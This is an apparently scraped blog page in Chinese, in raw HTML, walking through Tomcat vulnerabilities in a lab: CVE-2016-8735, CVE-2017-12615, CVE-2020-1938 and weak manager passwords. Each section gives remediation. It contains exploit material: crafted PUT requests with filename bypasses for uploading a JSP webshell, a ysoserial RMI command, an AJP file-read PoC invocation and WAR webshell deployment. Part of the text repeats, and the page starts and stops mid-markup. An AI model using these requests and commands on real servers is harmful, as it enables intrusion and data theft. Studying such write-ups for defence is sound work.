class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span> </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>readonly<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span> </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span> </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813100605923.png\" alt=\"image-20200813100605923\"></p>\n<p>2、修改请求头并传递post数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT &#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.3.49:8080</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Length: 5</span><br><span class=\"line\"></span><br><span class=\"line\">shell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813131648712.png\" alt=\"image-20200813131648712\"></p>\n<p>由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。</p>\n<p>此时可以利用上面介绍的绕过方式</p>\n<p>利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT &#x2F;shell.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.3.49:8080</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Length: 5</span><br><span class=\"line\"></span><br><span class=\"line\">shell</span><br></pre></td></tr></table></figure>\n\n<p>下图所示修改shell.jsp/即可上传成功</p>\n<p><img src=\"/images/tomcat/image-20200813131744168.png\" alt=\"image-20200813131744168\"></p>\n<p>文件访问</p>\n<p><img src=\"/images/tomcat/image-20200813133423171.png\" alt=\"image-20200813133423171\"></p>\n<p>shell管理</p>\n<p><img src=\"/images/tomcat/image-20200813134428832.png\" alt=\"image-20200813134428832\"></p>\n<h5 id=\"漏洞修复-1\"><a href=\"#漏洞修复-1\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、删除web.xml文件中readonly属性的值为true或直接删除</p>\n<p>2、更新至官方最新</p>\n<h4 id=\"CVE-2020-1938\"><a href=\"#CVE-2020-1938\" class=\"headerlink\" title=\"CVE-2020-1938\"></a>CVE-2020-1938</h4><h5 id=\"漏洞描述-2\"><a href=\"#漏洞描述-2\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>CVE-2020-1938是由于Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。</p>\n<p>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>\n<h5 id=\"影响范围-2\"><a href=\"#影响范围-2\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Tomcat 6</p>\n<p>Apache Tomcat 7 &lt; 7.0.100</p>\n<p>Apache Tomcat 8 &lt; 8.5.51</p>\n<p>Apache Tomcat 9 &lt; 9.0.31</p>\n<h5 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p>\n<h5 id=\"漏洞条件-2\"><a href=\"#漏洞条件-2\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>无条件（漏洞环境<a href=\"https://github.com/0nise/CVE-2020-1938\">参考</a>zip解压并执行）</p>\n<h5 id=\"漏洞检测-2\"><a href=\"#漏洞检测-2\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813153350723.png\" alt=\"image-20200813153350723\"></p>\n<p>2、端口号检测</p>\n<p><img src=\"/images/tomcat/image-20200813153640165.png\" alt=\"image-20200813153640165\"></p>\n<p>由上可以知道目标主机开放8009端口号。</p>\n<p>3、PoC读取文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.167 -p 8009 -f WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813153702055.png\" alt=\"image-20200813153702055\"></p>\n<h5 id=\"漏洞修复-2\"><a href=\"#漏洞修复-2\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、下载最新</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-70.cgi</span><br><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-80.cgi</span><br><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-90.cgi</span><br><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;tomcat&#x2F;releases</span><br></pre></td></tr></table></figure>\n\n<p>2、临时禁用AJP协议端口，</p>\n<p>在conf/server.xml</p>\n<p><code>注释此行&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code></p>\n<p><img src=\"/images/tomcat/image-20200813154014736.png\" alt=\"image-20200813154014736\"></p>\n<h4 id=\"Weak-password\"><a href=\"#Weak-password\" class=\"headerlink\" title=\"Weak password\"></a>Weak password</h4><h5 id=\"漏洞描述-3\"><a href=\"#漏洞描述-3\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。</p>\n<h5 id=\"影响范围-3\"><a href=\"#影响范围-3\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>所有版本</p>\n<h5 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>口令设置较弱，可直接爆破。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf/tomcat-users.xml(添加一行即可)</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span> <span class=\"attr\">username</span>=<span class=\"string\">&quot;tomcat&quot;</span> <span class=\"attr\">password</span>=<span class=\"string\">&quot;tomcat&quot;</span> <span class=\"attr\">roles</span>=<span class=\"string\">&quot;manager-status,manager-gui,manager-script,manager-jmx&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞条件-3\"><a href=\"#漏洞条件-3\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>无条件</p>\n<h5 id=\"漏洞检测-3\"><a href=\"#漏洞检测-3\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813163502206.png\" alt=\"image-20200813163502206\"></p>\n<p>2、点击“Server Status”</p>\n<p><img src=\"/images/tomcat/image-20200813163542988.png\" alt=\"image-20200813163542988\"></p>\n<p>3、尝试爆破</p>\n<p><a href=\"https://github.com/magicming200/tomcat-weak-password-scanner\">脚本</a></p>\n<p><img src=\"/images/tomcat/image-20200813163718308.png\" alt=\"image-20200813163718308\"></p>\n<p>4、生成war包</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  server jar -cvf  shell.war shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813163839974.png\" alt=\"image-20200813163839974\"></p>\n<p>5、部署war包</p>\n<p><img src=\"/images/tomcat/image-20200813164753751.png\" alt=\"image-20200813164753751\"></p>\n<p>6、访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.167:8080&#x2F;shell&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813164812341.png\" alt=\"image-20200813164812341\"></p>\n<p><img src=\"/images/tomcat/image-20200813164838466.png\" alt=\"image-20200813164838466\"></p>\n<h5 id=\"漏洞修复-3\"><a href=\"#漏洞修复-3\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、设置强壮密码</p>\n<p>2、平时不用，不允许登录</p>\n<h3 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><p><a href=\"https://github.com/si1ent-le/vuln-all/tree/master/Tomcat_vuln/weakpassword/tomcat_weakpassword_brute\">Weak_password_brute</a></p>\n<p><a href=\"https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2020-1938/CNVD-2020-10487-Tomcat-Ajp-lfi.py\">CVE-2020-1938</a></p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;tomcat</span><br><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5610</span><br><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;0nise&#x2F;CVE-2020-1938</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Java环境安装</span><br><span class=\"line\">https:&#x2F;&#x2F;www.java.com&#x2F;en&#x2F;download&#x2F;manual.jsp</span><br><span class=\"line\">Tomcat</span><br><span class=\"line\">https:&#x2F;&#x2F;tomcat.apache.org&#x2F;download-70.cgi</span><br><span class=\"line\">以下部分漏洞环境可参考github每个漏洞介绍及实战都已提供。</span><br></pre></td></tr></table></figure>\n\n<p>1、下载并解压</p>\n<img src=\"/images/tomcat/image-20200811143320510.png\" alt=\"image-20200811143320510\" style=\"zoom:50%;\" />\n\n<p>2、双击执行启动服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;192.168.3.156:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200811143448762.png\" alt=\"image-20200811143448762\"></p>\n<h4 id=\"Tomcat结构介绍\"><a href=\"#Tomcat结构介绍\" class=\"headerlink\" title=\"Tomcat结构介绍\"></a>Tomcat结构介绍</h4><p>下载解压后存在目录、文件信息：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin-----存放Tomcat的脚本文件，例如启动、关闭</span><br><span class=\"line\">conf----Tomcat的配置文件，例如server.xml和web.xml</span><br><span class=\"line\">lib-----存放Tomcat运行需要的库文件（JAR包）</span><br><span class=\"line\">logs----存放Tomcat执行时的LOG文件</span><br><span class=\"line\">temp----存放Tomcat运行时所产生的临时文件</span><br><span class=\"line\">webapps-Web发布目录，默认情况下把Web应用文件放于此目录</span><br><span class=\"line\">work----存放jsp编译后产生的class文件</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞分类实战\"><a href=\"#漏洞分类实战\" class=\"headerlink\" title=\"漏洞分类实战\"></a>漏洞分类实战</h3><h4 id=\"CVE-2016-8735\"><a href=\"#CVE-2016-8735\" class=\"headerlink\" title=\"CVE-2016-8735\"></a>CVE-2016-8735</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。</p>\n<h5 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Tomcat 9.0.0.M1 to 9.0.0.M11 </p>\n<p>Apache Tomcat 8.5.0 to 8.5.6 </p>\n<p>Apache Tomcat 8.0.0.RC1 to 8.0.38 </p>\n<p>Apache Tomcat 7.0.0 to 7.0.72 </p>\n<p>Apache Tomcat 6.0.0 to 6.0.47</p>\n<h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。</p>\n<h5 id=\"漏洞条件\"><a href=\"#漏洞条件\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p>1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 </p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf/server.xml</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Listener</span> <span class=\"attr\">className</span>=<span class=\"string\">&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot;</span> <span class=\"attr\">rmiRegistryPortPlatform</span>=<span class=\"string\">&quot;10001&quot;</span> <span class=\"attr\">rmiServerPortPlatform</span>=<span class=\"string\">&quot;10002&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200812101526860.png\" alt=\"image-20200812101526860\"></p>\n<p>2、下载对应jar放到lib目录下：</p>\n<ul>\n<li>catalina-jmx-remote.jar要与对应tomcat版本一致<a href=\"https://archive.apache.org/dist/tomcat/\">不同版本下载</a>一般存在extras文件下，如下图所示</li>\n<li><a href=\"https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9\">groovy2.3.9</a>下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）</li>\n</ul>\n<p><img src=\"/images/tomcat/image-20200812102130773.png\" alt=\"image-20200812102130773\"></p>\n<p><img src=\"/images/tomcat/image-20200811163431177.png\" alt=\"image-20200811163431177\"></p>\n<p>3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=<span class=\"keyword\">false</span> -Dcom.sun.management.jmxremote.authenticate=<span class=\"keyword\">false</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>-Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯</li>\n<li>-Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证</li>\n</ul>\n<p><img src=\"/images/tomcat/image-20200812101910590.png\" alt=\"image-20200812101910590\"></p>\n<p>4、服务启动</p>\n<p>下图所示：服务已启动10001端口已启动</p>\n<p><img src=\"/images/tomcat/image-20200812103050881.png\" alt=\"image-20200812103050881\"></p>\n<h5 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、执行以下PoC</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <span class=\"number\">192.168</span>.<span class=\"number\">3.165</span> <span class=\"number\">10001</span> Groovy1 calc.exe</span><br></pre></td></tr></table></figure>\n\n<p>Java 1.8出现报错</p>\n<p><img src=\"/images/tomcat/image-20200812104703039.png\" alt=\"image-20200812104703039\"></p>\n<p>1.7的jdk成功弹出计算器</p>\n<p><img src=\"/images/tomcat/PoC.gif\" alt=\"PoC\"></p>\n<h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。</p>\n<p>升级jdk（目前测试1.8是无法利用）</p>\n<p>推荐方案：官方已经发布了版本更新，建议您升级到最新版本。</p>\n<ul>\n<li><p>Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)</p>\n</li>\n<li><p>Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)</p>\n</li>\n<li><p>Apache Tomcat 8.0.39或更新版本</p>\n</li>\n<li><p>Apache Tomcat 7.0.73或更新版本</p>\n</li>\n<li><p>Apache Tomcat 6.0.48或更新版本</p>\n</li>\n</ul>\n<h4 id=\"CVE-2017-12615\"><a href=\"#CVE-2017-12615\" class=\"headerlink\" title=\"CVE-2017-12615\"></a>CVE-2017-12615</h4><h5 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。</p>\n<h5 id=\"影响范围-1\"><a href=\"#影响范围-1\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>Apache Tomcat 7.0.0 – 7.0.79</p>\n<h5 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端</p>\n<p>默认<code>readonly</code>为<code>true</code>，也就是无法进行PUT、DELETE行为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">conf&#x2F;web.xml\t\t&#x2F;&#x2F;文件内容</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813095843352.png\" alt=\"image-20200813095843352\"></p>\n<p>这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：</p>\n<p><img src=\"/images/tomcat/image-20200813100218371.png\" alt=\"image-20200813100218371\"></p>\n<p>可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。</p>\n<p>绕过方式：</p>\n<p>Windows：<br>1、利用/shell.jsp::$DATA的方式绕过<br>2、/shell.jsp%20，空格绕过<br>3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/<br>Linux：<br>1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/</p>\n<h5 id=\"漏洞条件-1\"><a href=\"#漏洞条件-1\" class=\"headerlink\" title=\"漏洞条件\"></a>漏洞条件</h5><p><code>readonly</code>设置为<code>false</code>时会导致攻击者上传任意恶意文件。</p>\n<h5 id=\"漏洞检测-1\"><a href=\"#漏洞检测-1\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>漏洞环境使用<a href=\"https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615\">P牛docker</a>镜像验证。</p>\n<p>Tomcat version: 8.5.19</p>\n<p><img src=\"/images/tomcat/image-20200813140738965.png\" alt=\"image-20200813140738965\"></p>\n<p>将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。</p>\n<p>1、readonly默认值为true，手动将其改为false，在<code>conf/web.xml</code>中手动添加红色方框类内容。</p>\n<p>添加如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span> </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>readonly<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span> </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span> </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813100605923.png\" alt=\"image-20200813100605923\"></p>\n<p>2、修改请求头并传递post数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT &#x2F;shell.jsp HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.3.49:8080</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Length: 5</span><br><span class=\"line\"></span><br><span class=\"line\">shell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tomcat/image-20200813131648712.png\" alt=\"image-20200813131648712\"></p>\n<p>由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。</p>\n<p>此时可以利用上面介绍的绕过方式</p>\n<p>利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT &#x2F;shell.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 192.168.3.49:8080</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Length: 5</span><br><span class=\"line\"></span><br><span class=\"line\">shell</span><br></pre></td></tr></table></figure>\n\n<p>下图所示修改shell.jsp/即可上传成功</p>\n<p><img src=\"/images/tomcat/image-20200813131744168.png\" alt=\"image-20200813131744168\"></p>\n<p>文件访问</p>\n<p><img src=\"/images/tomcat/image-20200813133423171.png\" alt=\"image-20200813133423171\"></p>\n<p>shell管理</p>\n<p><img src=\"/images/tomcat/image-20200813134428832.png\" 